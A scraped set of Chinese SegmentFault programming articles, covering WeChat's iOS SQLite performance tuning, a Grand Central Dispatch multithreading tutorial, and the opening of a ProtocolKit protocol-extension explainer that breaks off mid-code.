<p>同样的，在数据库关闭时，SQLite也会进行checkpoint。不同的是，checkpoint成功之后，会将WAL文件长度删除或truncate到0。下次打开数据库，并写入数据时，WAL文件需要重新增长。而对于文件系统来说，这就意味着需要<strong>消耗时间重新寻找合适的文件块</strong>。</p>
<p>显然SQLite的设计是针对容量较小的设备，尤其是在十几年前的那个年代，这样的设备并不在少数。而随着硬盘价格日益降低，对于像iPhone这样的设备，几MB的空间已经不再是需要斤斤计较的了。</p>
<p>因此我们可以修改为：</p>
<ul><li><p>数据库关闭并checkpoint成功时，不再truncate或删除WAL文件只修改WAL的文件头的Magic Number。下次数据库打开时，SQLite会识别到WAL文件不可用，重新从头开始写入。</p></li></ul>
<blockquote><p>保留WAL文件大小后，每个数据库都会有这约3.9MB的额外空间占用。如果数据库较多，这些空间还是不可忽略的。因此，微信中目前只对读写频繁且检测到卡顿的数据库开启，如聊天记录数据库。</p></blockquote>
<h4>mmap优化</h4>
<p>mmap对I/O性能的提升无需赘言，尤其是对于读操作。SQLite也在OS层封装了mmap的接口，可以无缝地切换mmap和普通的I/O接口。只需配置<code>PRAGMA mmap_size=XXX</code>即可开启mmap。</p>
<blockquote>
<p><a href=""https://www.sqlite.org/mmap.html"" rel=""nofollow noreferrer"">There are advantages and disadvantages to using memory-mapped I/O. Advantages include:</a></p>
<p><a href=""https://www.sqlite.org/mmap.html"" rel=""nofollow noreferrer"">Many operations, especially I/O intensive operations, can be much faster since content does need to be copied between kernel space and user space. In some cases, performance can nearly double.</a></p>
<p><a href=""https://www.sqlite.org/mmap.html"" rel=""nofollow noreferrer"">The SQLite library may need less RAM since it shares pages with the operating-system page cache and does not always need its own copy of working pages.</a></p>
</blockquote>
<p>然而，你在iOS上这样配置恐怕不会有任何效果。因为早期的iOS版本的存在一些bug，SQLite在编译层就关闭了在iOS上对mmap的支持，并且后知后觉地在<a href=""http://www.sqlite.org/src/info/e9a51d2a580daa0f"" rel=""nofollow noreferrer"">16年1月才重新打开</a>。所以如果使用的SQLite版本较低，还需注释掉相关代码后，重新编译生成后，才可以享受上mmap的性能。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006658261"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""SQLite开启iOS mmap"" title=""SQLite开启iOS mmap""></span></p>
<p>开启mmap后，SQLite性能将有所提升，但这还不够。因为它只会对DB文件进行了mmap，而WAL文件享受不到这个优化。</p>
<p>WAL文件长度是可能变短的，而在多句柄下，对WAL文件的操作是并行的。一旦某个句柄将WAL文件缩短了，而没有一个通知机制让其他句柄进行更新mmap的内容。此时其他句柄若使用mmap操作已被缩短的内容，就会造成crash。而普通的I/O接口，则只会返回错误，不会造成crash。因此，SQLite没有实现对WAL文件的mmap。</p>
<p>还记得我们上一个优化吗？没错，我们保留了WAL文件的大小。因此它在这个场景下是不会缩短的，那么不能mmap的条件就被打破了。实现上，只需在WAL文件打开时，用<code>unixMapfile</code>将其映射到内存中，SQLite的OS层即会自动识别，将普通的I/O接口切换到mmap上。</p>
<h2>其他优化</h2>
<h4>禁用文件锁</h4>
<p>如我们在多线程优化时所说，对于iOS app并没有多进程的需求。因此我们可以直接注释掉<code>os_unix.c</code>中所有文件锁相关的操作。也许你会很奇怪，虽然没有文件锁的需求，但这个操作耗时也很短，是否有必要特意优化呢？其实并不全然。耗时多少是比出来。</p>
<p>SQLite中有cache机制。被加载进内存的page，使用完毕后不会立刻释放。而是在一定范围内通过LRU的算法更新page cache。这就意味着，如果cache设置得当，大部分读操作不会读取新的page。然而因为文件锁的存在，本来只需在内存层面进行的读操作，不得不进行至少一次I/O操作。而我们知道，I/O操作是远远慢于内存操作的。</p>
<h4>禁用内存统计锁</h4>
<p>SQLite会对申请的内存进行统计，而这些统计的数据都是放到同一个全局变量里进行计算的。这就意味着统计前后，都是需要加线程锁，防止出现多线程问题的。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006658309"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>内存申请虽然不是非常耗时的操作，但却很频繁。多线程并发时，各线程很容易互相阻塞。</p>
<p>阻塞虽然也很短暂，但频繁地切换线程，却是个很影响性能的操作，尤其是单核设备。</p>
<p>因此，如果不需要内存统计的特性，可以通过<code>sqlite3_config(SQLITE_CONFIG_MEMSTATUS, 0) </code>进行关闭。这个修改虽然不需要改动源码，但如果不查看源码，恐怕是比较难发现的。</p>
<p>优化上线后，卡顿监控系统监测到</p>
<ul>
<li><p>DB写操作造成的卡顿下降超过80%</p></li>
<li><p>DB读操作造成的卡顿下降超过85%</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006658076"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""db读写卡顿"" title=""db读写卡顿""></span></p>
<h2>结语</h2>
<p>移动客户端数据库虽然不如后台数据库那么复杂，但也存在着不少可挖掘的技术点。本次尝试了仅对SQLite原有的方案进行优化，而市面上还有许多优秀的数据库，如LevelDB、RocksDB、Realm等，它们采用了和SQLite不同的实现原理。后续我们将借鉴它们的优化经验，尝试更深入的优化。</p>

                ", 【腾讯Bugly干货分享】微信 iOS SQLite 源码优化实践,1531972004,392,1,772,1,1,https://segmentfault.com/a/1190000006657544
88,1,0,6,"
                    
<p>[TOC]</p>
<h2>GCD是什么</h2>
<p>Grand Central Dispatch 是苹果公司发布的一套多核多线程任务分发的解决方案，简称GCD，或者你叫他滚床单也没有人反对，嘿嘿。</p>
<h2>GCD发布</h2>
<p>苹果公司首次发布GCD是伴随Mac OS X 10.6 和 iOS 4系统一起发布的，也正是伴随着block块语法的支持，GCD技术将多线程执行代码，通过block封装成代码块，大大提高了多线程开发的效率，减少了开发难度，也极大增强了代码的可读性。</p>
<h2>GCD之前的黑暗时代</h2>
<p>如果我将GCD技术比喻成普罗米修斯带给人类的火种有一些夸张的话，至少可以将其比作火柴。而在没有生火器的石器时代，人类只能依靠何钻木取火。</p>
<h3>POSIX线程</h3>
<p>POSIX线程(pthread)是一套C语言编写的线程管理API，面向过程，我只在老东家一套C源码库中见别人用过，自己从来没有用过，也不会用，就像我也不会钻木取火一样。</p>
<h3>NSThread</h3>
<p>Cocoa框架中，用OC将pthread对象化封装，就诞生了<code>NSThread</code>操作类，但很可惜至今<code>NSThread.h</code>头文件中一行注释都木有，只能看出这个类早在1994年就已经存在了。</p>
<p>这里就不列举具体事例了，因为如今这个类的使用频率已经非常低了，唯一一种你可能会遇到的使用情境是判断当前执行线程是否为主线程，具体代码如下</p>
<pre><code class=""objc"">  if([NSThread isMainThread]){
        
  }</code></pre>
<p>但你在GCD和NSOperation出现之前，会在各种需要多线程处理的情况下，使用<code>NSThread</code>的隐式调用方法，也就是NSThread头文件中给<code>NSObject    </code>类作为属性方法扩展的一系列接口：</p>
<pre><code class=""objc"">@interface NSObject (NSThreadPerformAdditions)

- (void)performSelectorOnMainThread:(SEL)aSelector withObject:(nullable id)arg waitUntilDone:(BOOL)wait modes:(nullable NSArray&lt;NSString *&gt; *)array;
- (void)performSelectorOnMainThread:(SEL)aSelector withObject:(nullable id)arg waitUntilDone:(BOOL)wait;
    // equivalent to the first method with kCFRunLoopCommonModes

- (void)performSelector:(SEL)aSelector onThread:(NSThread *)thr withObject:(nullable id)arg waitUntilDone:(BOOL)wait modes:(nullable NSArray&lt;NSString *&gt; *)array NS_AVAILABLE(10_5, 2_0);
- (void)performSelector:(SEL)aSelector onThread:(NSThread *)thr withObject:(nullable id)arg waitUntilDone:(BOOL)wait NS_AVAILABLE(10_5, 2_0);
    // equivalent to the first method with kCFRunLoopCommonModes
- (void)performSelectorInBackground:(SEL)aSelector withObject:(nullable id)arg NS_AVAILABLE(10_5, 2_0);

@end</code></pre>
<p>总计五个API，简易实现了一般开发需要使用的基本线程操作，避免用户自己动手写NSThread调度，引发的一些列莫名的死锁问题，在某种程度上减少了当时的多线程开发难度。</p>
<p>但这些API有一些很直观的问题，例如由于OC语言限制，这些API的参数传递、返回值获取都不易实现，并且实际写出来的代码也会因为逻辑跳转分布在文件的各个位置，影响阅读和纠错，你不相信请看我从教科书上抄下来的例子：</p>
<pre><code class=""objc"">- (void)launchThreadByNSObject_performSelectorInBackground_withObject
{
    [self performSelectorInBackground:@selector(doWork) withObject:nil];
}

- (void) doWork
{
    /*
     *
     * 长时间处理
     *
     * 例如  图像处理
     *      网络数据请求
     *      大型数据库操作
     ＊      磁盘操作
     */
    
    //操作结束后调用主线程修改UI
    
    [self performSelectorOnMainThread:@selector(doneWork) withObject:nil waitUntilDone:NO];
}

- (void) doneWork
{
    //主线程修改UI
}</code></pre>
<p>这个例子是一个解决关于主线程刷新UI问题的例子，我们同学都知道所有有关UI刷新的方法，务必要在主线程调用，这是个硬性要求，是因为UI渲染就是在主线程循环中完成的，如果在支线程中调用，会出现莫名其妙的错误、UI卡死或者程序崩溃。</p>
<p>所以多线程在我们的日常开发中，用得最多的地方，就是网络数据的异步请求，然后主线程刷新UI。将有延迟和计算量大的操作放在支线程完成，待完成后使用主线程刷新UI，才能有效地防止主线程UI刷新阻塞。</p>
<h3>iOS 4与block</h3>
<p>iOS 4带来的编译器对block块语法的支持，有点像人类发现了磷这种易燃物质一样，带来的是火柴（GCD 和 NSOperation）这个更简易的生火工具。</p>
<p>GCD和NSOperation 可以看作是 pthread(面向过程)和NSThread（面向对象）的block升级版本，带来的多线程编程体验则是质的飞跃。</p>
<p>GCD像是火柴，轻便易用，随用随取。NSOperation则像打火机，一次开发，重复使用。</p>
<h2>GCD实战</h2>
<p>好了，已经说了十几分钟废话了，终要进入主题进行GCD多线程开发实战。在开始之前，希望大家要提前学习block块语法的相关知识，不要求熟练使用，只要求看得懂。</p>
<h3>实战一 异步加载</h3>
<p>还记得我们在上面展示的从教科书上抄下来的例子么，这个例子如果改成GCD的版本，会是什么样子的呢？</p>
<pre><code class=""objc"">//异步请求Dispatch
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
    //长时间处理
    dispatch_async(dispatch_get_main_queue(), ^{
        //主线程更新UI
    });
});</code></pre>
<p>这是什么鬼？我来解释一下。GCD使用的是C语言风格的调用接口，栗子中调用了两次<code>dispatch_async</code>方法，第一次将长时间处理操作分拨到支线程处理，在其完成后，跳转回主线程更新UI，操作都在方法的block参数中传入，简单明了，层级分明，没有传参障碍，没有阅读障碍，一气呵成，简直美极了。</p>
<p><code>dispatch_async</code>方法传入的第二个参数是执行block，没啥好说的，第一个参数则是线程。<code>dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0)</code>方法获取的Global线程，是非主线程中的一个，具体是哪个不用开发者操心，反正是系统认为这时候不是很忙的那一个。而两个传入参数中的第一个是线程的优先级(共四个优先级)，第二个参数则约定为0。<code>dispatch_get_main_queue()</code>这个没有任何参数的方法，返回的则是主线程。 </p>
<p>注意这里返回的参数类型是<code>dispatch_queue_t</code>，是一个普通变量，估计是线程的索引。真是两三句话就能讲明白的方法调用，什么你说听不懂、看不懂。无所谓呀～ 我们将这段代码加入代码片段，需要使用的时候拿出来用就行啦。</p>
<p>比如：</p>
<h4>图片异步加载</h4>
<p>首先放开权限<code>NSAppTransportSecurity</code>,<code>NSAllowsArbitraryLoads</code></p>
<h5>NSURLConnection版本</h5>
<p>不加多线程异步操作</p>
<pre><code class=""objc"">- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@""cell"" forIndexPath:indexPath];

    [cell.imageView setImage:[UIImage new]];
    
    NSURL* url = [NSURL URLWithString:self.static_data[indexPath.row]];
    NSData* data = [NSURLConnection sendSynchronousRequest:[NSURLRequest requestWithURL:url] returningResponse:nil error:nil];
    UIImage* image = [UIImage imageWithData:data];
    [cell.imageView setImage:image];
    [cell setNeedsLayout];

    return cell;
}</code></pre>
<p>使用GCD以后</p>
<pre><code class=""objc"">- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@""cell"" forIndexPath:indexPath];

    [cell.imageView setImage:[UIImage new]];
    
    NSURL* url = [NSURL URLWithString:self.static_data[indexPath.row]];

    dispatch_async( dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSData* data = [NSURLConnection sendSynchronousRequest:[NSURLRequest requestWithURL:url] returningResponse:nil error:nil];
        UIImage* image = [UIImage imageWithData:data];
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [cell.imageView setImage:image];
            [cell setNeedsLayout];
        });
    });

    return cell;
}</code></pre>
<h5>NSURLSession版本</h5>
<pre><code class=""objc"">- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@""cell"" forIndexPath:indexPath];
    
//    cell.backgroundColor = [UIColor lightGrayColor];
    // Configure the cell...
    [cell.imageView setImage:[UIImage new]];
    
    NSURL* url = [NSURL URLWithString:self.static_data[indexPath.row]];
    NSURLSessionConfiguration* c = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession* session = [NSURLSession sessionWithConfiguration:c];
    NSURLSessionDataTask* task = [session dataTaskWithURL:url completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        
        dispatch_async(dispatch_get_main_queue(), ^{
            UIImage* image = [UIImage imageWithData:data];
            //                NSLog(@""%@"",image);
            //                NSLog(@""%@"",cell.imageView);
            [cell.imageView setImage:image];
            [cell setNeedsLayout];
        });
        
    }];
    [task resume];
    return cell;
}</code></pre>
<p>这次试出来UI刷新的阻塞感受了么？啊？你说没有，那你用真机调试一下，就会有更明显的感受了。</p>
<p>UI阻塞在实际开发中，偶尔会遇到。并且会引起一些莫名其妙的bug，希望大家再遇到时候能及时往这方面思考。比如，我们如果在<code>UIViewController</code>的初始化等一系列加载函数中加入能引起阻塞的代码，整个VC的加载会产生卡顿，还很有可能直接崩溃。</p>
<p>所以将阻塞操作放在支线程处理，是十分必要的。我们只要将下面代码存为代码片段，随用随取。</p>
<pre><code class=""objc"">//支线程调用
dispatch_async( dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            &lt;#code#&gt;
});

//主线程调用
dispatch_async(dispatch_get_main_queue(), ^{
        &lt;#code#&gt;
});</code></pre>
<h3>实战二 同步操作等待</h3>
<p>多线程操作的第二个常用情景就是并行操作等待。</p>
<pre><code class=""objc"">dispatch_group_t group = dispatch_group_create();
    // 合并汇总结果
    dispatch_group_async(group, dispatch_get_global_queue(0,0), ^{
            //并行阻塞操作1
        [NSThread sleepForTimeInterval:1.0];
        NSLog(@""1"");
    });
    dispatch_group_async(group, dispatch_get_global_queue(0,0), ^{
        //并行阻塞操作2
        [NSThread sleepForTimeInterval:0.5];
        NSLog(@""2"");
    });
    dispatch_group_async(group, dispatch_get_global_queue(0,0), ^{
        //并行阻塞操作3
        NSLog(@""3"");
    });
    dispatch_group_notify(group, dispatch_get_main_queue(), ^{
        //3项操作都完成后调用主线程更新UI
        NSLog(@""4"");
    });</code></pre>
<p>在这段演示代码里面，即使你看不懂GCD相关调用，也能猜出最后的输出结果对吧，我解释一下<code>[NSThread sleepForTimeInterval:1.0];</code>这句调用是让线程睡眠1秒中，模拟1秒钟阻塞。</p>
<p>好的告诉我你的答案。</p>
<pre><code class=""objc"">3
2
1
4</code></pre>
<p>这也是一段可以收藏为代码片段的实用工具，可以起名为<code>并行代码等待</code>。就像<code>异步等待</code>一样，我们现在来举一个简单的实际案例。</p>
<h4>并行操作案例</h4>
<p>还是举一个不是很简单的例子，也可能不是很实用，但绝对能体现这套逻辑的精髓。在讲栗子之前，我们先来学习一下SDWebImage的另外一段代码（对，又是SDWebImage）。</p>
<pre><code class=""objc"">//SDImageCache.m 608行

- (NSUInteger)getSize {
    __block NSUInteger size = 0;
    dispatch_sync(self.ioQueue, ^{
        NSDirectoryEnumerator *fileEnumerator = [_fileManager enumeratorAtPath:self.diskCachePath];
        for (NSString *fileName in fileEnumerator) {
            NSString *filePath = [self.diskCachePath stringByAppendingPathComponent:fileName];
            NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:filePath error:nil];
            size += [attrs fileSize];
        }
    });
    return size;
}</code></pre>
<p>这段代码，具体功能是进行文件夹文件大小的统计。对你没有听错，文件夹是无法直接接获取其大小的，需要遍历其中每个文件然后相加统计。</p>
<p>这段代码实用GCD，但使用的方法我们前面并没有讲过，我放在后面再说。目前我们的任务是把这个方法改造一下，让他可以统计任意的文件夹大小。</p>
<pre><code class=""objc"">- (NSUInteger)getSize:(NSString*)dicPath {
    __block NSUInteger size = 0;
    NSDirectoryEnumerator *fileEnumerator = [[NSFileManager defaultManager] enumeratorAtPath:dicPath];
    for (NSString *fileName in fileEnumerator) {
        NSString *filePath = [dicPath stringByAppendingPathComponent:fileName];
        NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:filePath error:nil];
        size += [attrs fileSize];
    }
    return size;
}</code></pre>
<p>接下来我们统计一下cache目录和tmp目录的容量</p>
<pre><code class=""objc"">NSArray *paths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
NSString *cachesDir = [paths objectAtIndex:0];
NSString *tmpDir = NSTemporaryDirectory();
    
NSUInteger cacheSize = [self getSize:cachesDir];
NSUInteger tmpSize = [self getSize:tmpDir];
    
NSLog(@""total size : %@ (%@+%@)"",@(cacheSize + tmpSize),@(cacheSize),@(tmpSize));</code></pre>
<blockquote><p>total size : 657060 (657060+0)</p></blockquote>
<p>tmp文件夹是空的，我们换成libiary目录，不过因为cache目录在libiary目下，所以是有重复的，不过无所谓。</p>
<pre><code class=""objc"">NSArray *paths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
NSString *cachesDir = [paths objectAtIndex:0];

NSArray * paths2 = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
NSString * libraryPath = paths2[0];
    
NSUInteger cacheSize = [self getSize:cachesDir];
NSUInteger librarySize = [self getSize:libraryPath];
    
NSLog(@""total size : %@ (%@+%@)"",@(cacheSize + librarySize),@(cacheSize),@(librarySize));</code></pre>
<p>我们在执行这段代码的时候，一般会很顺畅就执行完了，没有任何阻塞。原因是统计的目标目录，文件非常少。如果遇到文件稍多的情况，上面这段代码就出出现阻塞，又因为整个是在主线程操作的，所以必然会影响到UI的刷新，界面会卡顿。好，那让我们运用前面的GCD模版来将这段代码改造成异步执行。</p>
<pre><code class=""objc"">NSLog(@""1"");
    
dispatch_async( dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
   
   NSArray *paths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
   NSString *cachesDir = [paths objectAtIndex:0];
   
   NSArray * paths2 = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
   NSString * libraryPath = paths2[0];
   
   NSUInteger cacheSize = [self getSize:cachesDir];
   NSUInteger librarySize = [self getSize:libraryPath];
   dispatch_async(dispatch_get_main_queue(), ^{
       
           NSLog(@""total size : %@ (%@+%@)"",@(cacheSize + librarySize),@(cacheSize),@(librarySize));
       
   });
});
    
NSLog(@""2"");</code></pre>
<p>上面是我修改的结果，大家来分析一下输出顺序，应该是</p>
<pre><code class=""objc"">1
2
total size : 1314324 (657060+657264)</code></pre>
<p>前面坐了这么多铺垫，接下来我们进入正题，讲解一下串行和并行。串行很好理解，我们一般写的代码都是一步一步一串一串执行的。并行则是多项任务同时进行，也不难理解，类似于中学物理学的电路的并联合串联。</p>
<p>上面这段代码，我们前后调用两次getSize方法，按顺序分别统计了两个目录的大小，我们统计一下耗时：</p>
<pre><code class=""objc"">dispatch_async( dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
   
   clock_t begin, duration;
   
   NSArray *paths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
   NSString *cachesDir = [paths objectAtIndex:0];
   
   NSArray * paths2 = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
   NSString * libraryPath = paths2[0];
   
   begin = clock();
   
   NSUInteger cacheSize = [self getSize:cachesDir];
   NSUInteger librarySize = [self getSize:libraryPath];
   
   duration = clock() - begin;
   
   NSLog(@""%@"",@((double)duration/CLOCKS_PER_SEC));
   
   dispatch_async(dispatch_get_main_queue(), ^{
       
           NSLog(@""total size : %@ (%@+%@)"",@(cacheSize + librarySize),@(cacheSize),@(librarySize));
       
   });
});</code></pre>
<blockquote><p>0.002481</p></blockquote>
<p>这里单位是秒，其实已经很快。 好，我们把前面的并行模版套进来。</p>
<pre><code class=""objc"">dispatch_async( dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
   
   NSString *path = [[NSBundle mainBundle] bundlePath];
   
   NSArray * paths2 = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
   NSString * libraryPath = paths2[0];
   
   __block clock_t begin, duration;
   __block NSUInteger cacheSize,librarySize;
   
   dispatch_group_t group = dispatch_group_create();
   // 合并汇总结果
   
   begin = clock();
   dispatch_group_async(group, dispatch_get_global_queue(0,0), ^{
      
        cacheSize = [self getSize:path];
   });
   dispatch_group_async(group, dispatch_get_global_queue(0,0), ^{
   
        librarySize = [self getSize:libraryPath];
   });
   dispatch_group_notify(group, dispatch_get_main_queue(), ^{
   
        duration = clock() - begin;
       NSLog(@""%@"",@((double)duration/CLOCKS_PER_SEC));
       NSLog(@""total size : %@ (%@+%@)"",@(cacheSize + librarySize),@(cacheSize),@(librarySize));
   });
});</code></pre>
<blockquote><p>0.039834</p></blockquote>
<h5>提问</h5>
<p>结果很让我欣慰，整整大了一个数量级，请你们分析一下原因。</p>
<p>原因也很简单，就是因为统计这种小目录是在耗时太短，短到比创建GCD Group的CPU占用都要少，所以耗时不降反增，呵呵。但一旦这个耗时任务CPU占用大于GCD消耗的时候，并行操作带来的耗时收益就是</p>
<blockquote><p>串行总耗时 - 并行最大耗时</p></blockquote>
<h2>小结</h2>
<p>这节课由于篇幅有限，我们讲的内容并不多，但实用性很高。大家注意到没有，从头到尾我们等于讲任何与GCD有关的接口调用、类型相关的内容，却教会了你进行异步请求和同步等待操作的方法，模版拿过来基本不用修改就能嵌套使用，这就叫知其然。下一章节我们再从API方向讲解GCD的类型和方法调用，这叫知其所以然。</p>

                ",  Grand Central Dispatch 1,1531972006,425,1,339,1,1,https://segmentfault.com/a/1190000006657435
89,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006760439"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>Swift 中的协议扩展为 iOS 开发带来了非常多的可能性，它为我们提供了一种类似多重继承的功能，帮助我们减少一切可能导致重复代码的地方。</p>
<h2>关于 Protocol Extension</h2>
<p>在 Swift 中比较出名的 Then 就是使用了协议扩展为所有的 <code>AnyObject</code> 添加方法，而且不需要调用 runtime 相关的 API，其实现简直是我见过最简单的开源框架之一：</p>
<pre><code class=""swift"">public protocol Then {}

extension Then where Self: AnyObject {
    public func then(@noescape block: Self -&gt; Void) -&gt; Self {
        block(self)
        return self
    }
}

extension NSObject: Then {}</code></pre>
<p>只有这么几行代码，就能为所有的 <code>NSObject</code> 添加下面的功能：</p>
<pre><code class=""swift"">let titleLabel = UILabel().then {
    $0.textColor = .blackColor()
    $0.textAlignment = .Center
}</code></pre>
<p>这里没有调用任何的 runtime 相关 API，也没有在 <code>NSObject</code> 中进行任何的方法声明，甚至 <code>protocol Then {}</code> 协议本身都只有一个大括号，整个 Then 框架就是基于协议扩展来实现的。</p>
<p>在 Objective-C 中同样有协议，但是这些协议只是相当于接口，遵循某个协议的类只表明实现了这些接口，每个类都需要<strong>对这些接口有单独的实现</strong>，这就很可能会导致重复代码的产生。</p>
<p>而协议扩展可以调用协议中声明的方法，以及 <code>where Self: AnyObject</code> 中的 <code>AnyObject</code> 的类/实例方法，这就大大提高了可操作性，便于开发者写出一些意想不到的扩展。</p>
<blockquote><p>如果读者对 Protocol Extension 兴趣或者不了解协议扩展，可以阅读最后的 <a>Reference</a> 了解相关内容。</p></blockquote>
<h2>ProtocolKit</h2>
<p>其实协议扩展的强大之处就在于它能为遵循协议的类添加一些方法的实现，而不只是一些接口，而今天为各位读者介绍的 <a>ProtocolKit</a> 就实现了这一功能，为遵循协议的类添加方法。</p>
<h3>ProtocolKit 的使用</h3>
<p>我们先来看一下如何使用 ProtocolKit，首先定义一个协议：</p>
<pre><code class=""objectivec"">@protocol TestProtocol

@required

- (void)fizz;

@optional

- (void)buzz;

@end</code></pre>
<p>在协议中定义了两个方法，必须实现的方法 <code>fizz</code> 以及可选实现 <code>buzz</code>，然后使用 ProtocolKit 提供的接口 <code>defs</code> 来定义协议中方法的实现了：</p>
<pre><code class=""objectivec"">@defs(TestProtocol)

- (void)buzz {
    NSLog(@""Buzz"");
}

@end</code></pre>
<p>这样所有遵循 <code>TestProtocol</code> 协议的对象都可以调用 <code>buzz</code> 方法，哪怕它们没有实现：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006760440"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""protocol-demo"" title=""protocol-demo""></span></p>
<p>上面的 <code>XXObject</code> 虽然没有实现 <code>buzz</code> 方法，但是该方法仍然成功执行了。</p>
<h3>ProtocolKit 的实现</h3>
<p>ProtocolKit 的主要原理仍然是 runtime 以及宏的；通过宏的使用来<strong>隐藏类的声明以及实现的代码</strong>，然后在 main 函数运行之前，<strong>将类中的方法实现加载到内存</strong>，使用 runtime 将实现<strong>注入到目标类</strong>中。</p>
<blockquote><p>如果你对上面的原理有所疑惑也不是太大的问题，这里只是给你一个 ProtocolKit 原理的简单描述，让你了解它是如何工作的。</p></blockquote>
<p>ProtocolKit 中有两条重要的执行路线：</p>
<ul>
<li><p><code>_pk_extension_load</code> 将协议扩展中的方法实现加载到了内存</p></li>
<li><p><code>_pk_extension_inject_entry</code> 负责将扩展协议注入到实现协议的类</p></li>
</ul>
<h4>加载实现</h4>
<p>首先要解决的问题是如何将方法实现加载到内存中，这里可以先了解一下上面使用到的 <code>defs</code> 接口，它其实只是一个调用了其它宏的<strong>超级宏</strong><del>这名字是我编的</del>：</p>
<pre><code class=""objectivec"">#define defs _pk_extension

#define _pk_extension($protocol) _pk_extension_imp($protocol, _pk_get_container_class($protocol))

#define _pk_extension_imp($protocol, $container_class) \
    protocol $protocol; \
    @interface $container_class : NSObject &lt;$protocol&gt; @end \
    @implementation $container_class \
    + (void)load { \
        _pk_extension_load(@protocol($protocol), $container_class.class); \
    } \

#define _pk_get_container_class($protocol) _pk_get_container_class_imp($protocol, __COUNTER__)
#define _pk_get_container_class_imp($protocol, $counter) _pk_get_container_class_imp_concat(__PKContainer_, $protocol, $counter)
#define _pk_get_container_class_imp_concat($a, $b, $c) $a ## $b ## _ ## $c</code></pre>
<blockquote><p>使用 <code>defs</code> 作为接口的是因为它是一个保留的 keyword，Xcode 会将它渲染成与 <code>@property</code> 等其他关键字相同的颜色。</p></blockquote>
<p>上面的这一坨宏并不需要一个一个来分析，只需要看一下最后展开会变成什么：</p>
<pre><code class=""objectivec"">@protocol TestProtocol; 

@interface __PKContainer_TestProtocol_0 : NSObject &lt;TestProtocol&gt;

@end

@implementation __PKContainer_TestProtocol_0

+ (void)load {
    _pk_extension_load(@protocol(TestProtocol), __PKContainer_TestProtocol_0.class); 
}</code></pre>
<p>根据上面宏的展开结果，这里可以介绍上面的一坨宏的作用：</p>
<ul>
<li><p><code>defs</code> 这货没什么好说的，只是 <code>_pk_extension</code> 的别名，为了提供一个更加合适的名字作为接口</p></li>
<li>
<p><code>_pk_extension</code> 向 <code>_pk_extension_imp </code> 中传入 <code>$protocol</code> 和 <code>_pk_get_container_class($protocol)</code> 参数</p>
<ul><li><p><code>_pk_get_container_class</code> 的执行生成一个类名，上面生成的类名就是 <code>__PKContainer_TestProtocol_0</code>，这个类名是 <code>__PKContainer_</code>、 <code>$protocol</code> 和 <code>__COUNTER__</code> 拼接而成的（<code>__COUNTER__</code> 只是一个计数器，可以理解为每次调用时加一）</p></li></ul>
</li>
<li><p><code>_pk_extension_imp</code> 会以传入的类名生成一个遵循当前 <code>$protocol</code> 协议的类，然后在 <code>+ load</code> 方法中执行 <code>_pk_extension_load</code> 加载扩展协议</p></li>
</ul>
<p>通过宏的运用成功隐藏了 <code>__PKContainer_TestProtocol_0</code> 类的声明以及实现，还有 <code>_pk_extension_load</code> 函数的调用：</p>
<pre><code class=""objectivec"">void _pk_extension_load(Protocol *protocol, Class containerClass) {
    
    pthread_mutex_lock(&amp;protocolsLoadingLock);
    
    if (extendedProtcolCount &gt;= extendedProtcolCapacity) {
        size_t newCapacity = 0;
        if (extendedProtcolCapacity == 0) {
            newCapacity = 1;
        } else {
            newCapacity = extendedProtcolCapacity &lt;&lt; 1;
        }
        allExtendedProtocols = realloc(allExtendedProtocols, sizeof(*allExtendedProtocols) * newCapacity);
        extendedProtcolCapacity = newCapacity;
    }
    
    ...

    pthread_mutex_unlock(&amp;protocolsLoadingLock);
}</code></pre>
